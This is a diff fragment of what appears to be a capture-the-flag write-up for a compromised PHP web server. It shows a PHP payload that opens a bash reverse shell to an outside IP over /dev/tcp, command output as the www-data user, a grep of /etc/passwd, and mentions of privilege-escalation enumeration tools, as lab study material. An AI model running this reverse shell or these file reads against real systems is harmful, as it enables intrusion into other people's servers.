@@ -115,6 +115,8 @@ Content-Type: text/html; charset=UTF-8
 www-data
 ````
 
+# User
+
 ````php
 <?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0<&1"')?>
 ````
@@ -130,8 +132,17 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ````
 
+````
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$  grep 'bash' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+````
 
-# User
+> LinPEAS
+> LinEnum
+
+
 
 # Root
 
